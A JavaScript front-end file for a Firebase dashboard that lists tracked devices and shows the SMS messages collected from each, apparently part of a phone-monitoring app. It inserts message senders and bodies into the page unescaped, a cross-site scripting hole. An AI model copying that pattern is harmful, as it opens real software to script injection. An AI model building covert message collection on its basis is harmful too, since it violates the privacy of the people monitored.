// sms-view.js

$(document).ready(function () {
    // Check if user is logged in
    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            loadDevices(user.uid); // Load devices for dropdown
        } else {
            // Redirect to login if no user is logged in
            window.location.href = "./login.html";
        }
    });

    // Load available devices into the dropdown
    function loadDevices(userUid) {
        const devicesRef = firebase.database().ref(`TrackPhone/${userUid}`);

        devicesRef.once("value", (snapshot) => {
            if (snapshot.exists()) {
                $("#deviceSelect").empty().append('<option value="">Choose a device</option>');
                snapshot.forEach((deviceSnapshot) => {
                    const deviceId = deviceSnapshot.key;
                    $("#deviceSelect").append(new Option(deviceId, deviceId));
                });

                // Set the dropdown to the last selected device
                const lastSelectedDevice = localStorage.getItem("lastSelectedDevice");
                if (lastSelectedDevice) {
                    $("#deviceSelect").val(lastSelectedDevice).change(); // Trigger change to load messages
                }
            } else {
                $("#deviceSelect").empty().append('<option value="">No devices found</option>');
                $("#messageList").append('<li class="list-group-item bg-dark text-light">No devices available.</li>');
            }
        });
    }

    // Load messages for the selected device
    function loadMessages(deviceId) {
        const userUid = firebase.auth().currentUser.uid;
        const messagesRef = firebase.database().ref(`TrackPhone/${userUid}/${deviceId}/sms_messages`);

        messagesRef.on("value", (snapshot) => {
            $("#messageList").empty(); // Clear previous messages
            if (snapshot.exists()) {
                snapshot.forEach((msgSnapshot) => {
                    const msgData = msgSnapshot.val();
                    const listItem = `
                        <li class="list-group-item bg-dark text-light mb-2 border-secondary">
                            <strong>Sender:</strong> ${msgData.sender}<br>
                            <strong>Message:</strong> ${msgData.messageBody}<br>
                            <strong>Timestamp:</strong> ${new Date(msgData.timestamp).toLocaleString()}
                        </li>
                    `;
                    $("#messageList").append(listItem);
                });
            } else {
                $("#messageList").append('<li class="list-group-item bg-dark text-light">No messages found for this device.</li>');
            }
        }, (error) => {
            console.error("Error loading messages:", error);
            $("#messageList").append('<li class="list-group-item bg-dark text-light">Error loading messages. Please try again later.</li>');
        });
    }

    // Listen for device selection change
    $("#deviceSelect").on("change", function () {
        const selectedDevice = $(this).val();

        if (selectedDevice) {
            loadMessages(selectedDevice); // Load messages for selected device
            $("#selectedDevice").text(`Device ID: ${selectedDevice}`);
            localStorage.setItem("lastSelectedDevice", selectedDevice); // Store selected device in local storage
        } else {
            $("#selectedDevice").empty();
            $("#messageList").empty().append('<li class="list-group-item bg-dark text-light">Please select a device to view messages.</li>');
            localStorage.removeItem("lastSelectedDevice"); // Clear stored device if none is selected
        }
    });

    // Logout user and redirect to login page
    $("#logoutBtn").click(async function () {
        try {
            await firebase.auth().signOut();
            localStorage.removeItem("lastSelectedDevice"); // Clear stored device on logout
            window.location.href = "./"; // Redirect to login page after logout
        } catch (error) {
            console.error("Logout error:", error);
            alert("Error logging out. Please try again.");
        }
    });

    // Connect Bot button click event
    $("#connectBotBtn").click(function () {
        window.location.href = "./connect-bot.html"; // Redirect to the Connect Bot page
    });
});
